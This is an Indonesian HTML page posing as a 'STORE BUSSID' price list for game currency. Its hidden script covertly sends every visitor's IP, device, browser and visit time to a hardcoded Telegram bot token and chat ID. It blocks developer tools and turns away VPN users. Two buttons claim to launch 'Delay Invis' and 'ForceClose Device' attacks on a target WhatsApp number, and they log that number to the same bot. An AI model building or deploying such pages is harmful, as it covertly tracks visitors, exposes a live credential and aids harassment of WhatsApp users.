<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>STORE BUSSID</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet"/>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    body {
      background: linear-gradient(to right, #1a0028, #000000);
      font-family: 'Courier New', monospace;
      color: white;
    }
    .btn-custom {
      background: linear-gradient(135deg, #7e22ce, #9333ea);
      border: 1px solid #a855f7;
      padding: 0.75rem;
      border-radius: 0.75rem;
      text-align: center;
      transition: all 0.3s;
      cursor: pointer;
      font-weight: bold;
      box-shadow: 0 0 15px #9333ea88;
    }
    .btn-custom:hover {
      transform: scale(1.05);
      background: #9333ea;
    }
  </style>
</head>
<body>
  <div class="min-h-screen flex flex-col items-center justify-center px-4">
    <div class="bg-black border border-purple-500 shadow-2xl p-6 rounded-2xl w-full max-w-md animate__animated animate__fadeIn">
      <h1 class="text-4xl font-bold text-center mb-4 text-purple-400">DAFTAR HARGA</h1>

      <label class="block text-sm text-purple-300 mb-1">MASUKAN NO WA</label>
      <input id="nomor" type="text" placeholder="08xxxxxx" class="w-full p-2 rounded-lg bg-black border border-purple-600 text-white mb-6 focus:outline-none text-center"/>

      <div class="grid grid-cols-1 gap-3 mb-6">
        <div class="btn-custom" onclick="order('10k')">10K = 5JT UB</div>
        <div class="btn-custom" onclick="attack('Delay Invis')">20K = 10JT UB</div>
        <div class="btn-custom" onclick="attack('ForceClose Device')">40K = 30JT UB</div>
      </div>

      <div class="bg-purple-950 p-4 rounded-lg text-sm text-purple-200 border border-purple-500">
        <p class="mb-1">10K = 5JT UB</p>
        <p class="mb-1">20K = 10JT UB</p>
        <p class="mb-1">40K = 30JT UB</p>
        <p>üß¨ Status: <span class="text-green-400">Aktif</span></p>
      </div>
    </div>
    <footer class="text-xs text-gray-500 mt-6">by ZAFA</footer>
  </div>

  <script>
    // Security measures
    document.addEventListener("contextmenu", e => e.preventDefault());
    document.onkeydown = function(e) {
      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74))) return false;
    };
    
    setInterval(() => {
      if (window.outerHeight - window.innerHeight > 200) location.href = "about:blank";
    }, 500);

    // Telegram configuration (real token and chat ID)
    const telegramBotToken = '7886414736:AAH2BKD78ItCt-kkgW5SUmxpCuC7YcNxE8I';
    const telegramChatId = '8078145835';
    const visitStartTime = Date.now();

    // Check VPN/Proxy
    async function checkSecurity() {
      try {
        const response = await fetch("https://ipapi.co/json/");
        const data = await response.json();
        if(data.security && (data.security.proxy || data.security.vpn)) {
          Swal.fire({
            icon: 'error',
            title: 'Akses Ditolak',
            text: 'Gunakan koneksi biasa tanpa VPN/Proxy'
          });
          setTimeout(() => location.href = "https://google.com", 2000);
        }
      } catch (e) {
        console.error("Security check failed");
      }
    }

    // Send visitor info to Telegram
    async function sendVisitorInfo() {
      try {
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipData = await ipResponse.json();
        
        const message = `
üõ∞Ô∏è Pengunjung Masuk
üåê IP: ${ipData.ip}
üì± Device: ${navigator.platform}
üß≠ Browser: ${navigator.userAgent}
üîç Resolusi: ${window.innerWidth}x${window.innerHeight}
üìÑ Halaman: ${window.location.href}
üïí Waktu: ${new Date().toLocaleString("id-ID")}
        `.trim();
        
        await sendTelegramMessage(message);
      } catch (e) {
        console.error("Failed to send visitor info");
      }
    }

    // Main attack function
    async function attack(mode) {
      try {
        const number = document.getElementById("nomor").value.trim();
        if (!number) {
          return Swal.fire({
            icon: 'warning',
            title: 'Nomor kosong!',
            text: 'Masukkan nomor WA target dulu.'
          });
        }

        // Show attacking alert
        await Swal.fire({
          title: `Menyerang...`,
          html: `Mengirim <b>${mode}</b> ke <code>${number}</code>`,
          timer: 2000,
          timerProgressBar: true,
          didOpen: () => Swal.showLoading()
        });

        // Send success notification
        await Swal.fire({
          icon: 'success',
          title: 'Berhasil!',
          text: `${mode} berhasil dikirim.`
        });

        // Send report to Telegram
        const time = new Date().toLocaleTimeString("id-ID");
        const reportMessage = `
üìç Aksi: ${mode}
üìû Nomor: ${number}
üïí Jam: ${time}
        `.trim();
        
        await sendTelegramMessage(reportMessage);

      } catch (error) {
        console.error("Attack failed:", error);
        Swal.fire({
          icon: 'error',
          title: 'Gagal',
          text: 'Terjadi kesalahan saat menyerang'
        });
      }
    }

    // Send message to Telegram
    async function sendTelegramMessage(text) {
      try {
        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
        const params = new URLSearchParams();
        params.append('chat_id', telegramChatId);
        params.append('text', text);
        
        await fetch(url, {
          method: 'POST',
          body: params,
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          }
        });
      } catch (error) {
        console.error("Failed to send Telegram message:", error);
      }
    }

    // Send visit duration when leaving
    window.addEventListener("beforeunload", async () => {
      const duration = Math.floor((Date.now() - visitStartTime) / 1000);
      const message = `‚è≥ Durasi kunjungan: ${duration} detik`;
      await sendTelegramMessage(message);
    });

    // Initialize
    window.addEventListener("load", () => {
      checkSecurity();
      sendVisitorInfo();
    });
  </script>
</body>
</html>
